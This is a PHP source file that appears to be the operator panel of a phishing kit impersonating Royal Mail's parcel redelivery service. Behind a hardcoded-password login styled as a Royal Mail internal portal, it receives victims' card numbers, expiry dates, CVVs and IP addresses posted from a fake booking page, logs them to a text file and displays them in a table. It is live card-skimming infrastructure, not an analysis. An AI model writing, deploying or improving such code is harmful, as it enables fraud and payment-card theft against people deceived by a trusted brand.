<?php
session_start();

$password = "Dogslover69";

if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['loggedin'] = true;
    } else {
        // Login Screen
        echo '<!DOCTYPE html>
        <html><head><title>Royal Mail - Internal Portal</title>
        <style>body{font-family:Arial;background:#2A2A2D;color:white;text-align:center;padding:120px 20px;}
        input{padding:14px;width:320px;font-size:17px;border-radius:4px;border:none;}
        button{padding:12px 40px;font-size:17px;background:#E4002B;color:white;border:none;border-radius:4px;}</style></head><body>
        <h1>Royal Mail Redelivery System</h1>
        <p style="color:#ccc;">Internal Administration Portal</p><br>
        <form method="POST">
        <input type="password" name="pass" placeholder="Enter Password" required><br><br>
        <button type="submit">Login</button>
        </form></body></html>';
        exit();
    }
}

// Create logs folder and file automatically
if (!is_dir('logs')) mkdir('logs', 0777, true);
$logfile = 'logs/redelivery.txt';
if (!file_exists($logfile)) file_put_contents($logfile, "");

$logs = file($logfile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Royal Mail Redelivery System - Administration</title>
    <style>
        body {font-family:Arial, Helvetica, sans-serif; background:#f4f4f4; margin:0;}
        .header {background:#E4002B; color:white; padding:20px; text-align:center; font-size:22px;}
        .container {max-width:1300px; margin:30px auto; background:white; padding:25px; box-shadow:0 4px 15px rgba(0,0,0,0.1);}
        table {width:100%; border-collapse:collapse;}
        th, td {padding:14px; text-align:left; border-bottom:1px solid #ddd;}
        th {background:#2A2A2D; color:white;}
        .count {font-size:26px; color:#E4002B; font-weight:bold;}
        .btn {background:#2A2A2D; color:white; padding:10px 20px; text-decoration:none; border-radius:4px; margin-right:10px;}
    </style>
</head>
<body>

<div class="header">
    Royal Mail Redelivery System - Administration Portal
</div>

<div class="container">
    <p><strong>Total Redelivery Records:</strong> <span class="count"><?= count($logs) ?></span></p>
    <a href="index.php" target="_blank" class="btn">Go to Booking Page</a>
    <a href="?logout=1" class="btn">Logout</a>

    <table>
        <tr>
            <th>Date & Time</th>
            <th>Booking ID</th>
            <th>Card Type</th>
            <th>Card Number</th>
            <th>Expiry Date</th>
            <th>CVV</th>
            <th>IP Address</th>
        </tr>
        <?php foreach ($logs as $line): 
            $data = json_decode($line, true);
            if (!$data) continue;
        ?>
        <tr>
            <td><?= htmlspecialchars($data['time'] ?? '') ?></td>
            <td><?= htmlspecialchars($data['booking_id'] ?? '') ?></td>
            <td><?= htmlspecialchars($data['card_type'] ?? '') ?></td>
            <td><?= htmlspecialchars($data['card_number'] ?? '') ?></td>
            <td><?= htmlspecialchars(($data['expiry_month'] ?? '') . '/' . ($data['expiry_year'] ?? '')) ?></td>
            <td><?= htmlspecialchars($data['cvv'] ?? '') ?></td>
            <td><?= htmlspecialchars($data['ip'] ?? '') ?></td>
        </tr>
        <?php endforeach; ?>
    </table>

    <?php if (empty($logs)): ?>
        <p style="text-align:center; padding:60px; color:#666;">No records received yet.</p>
    <?php endif; ?>
</div>

</body>
</html>

<?php
// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: admin.php");
    exit();
}

// Save data when received from delivery-booked.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['card_number'])) {
    $entry = [
        "time"        => date('Y-m-d H:i:s'),
        "booking_id"  => $_POST['booking_id'] ?? '',
        "card_type"   => $_POST['card_type'] ?? '',
        "card_number" => $_POST['card_number'] ?? '',
        "expiry_month"=> $_POST['expiry_month'] ?? '',
        "expiry_year" => $_POST['expiry_year'] ?? '',
        "cvv"         => $_POST['cvv'] ?? '',
        "ip"          => $_SERVER['REMOTE_ADDR']
    ];

    file_put_contents($logfile, json_encode($entry) . "\n", FILE_APPEND);
    exit("OK");
}
?>
}
?>
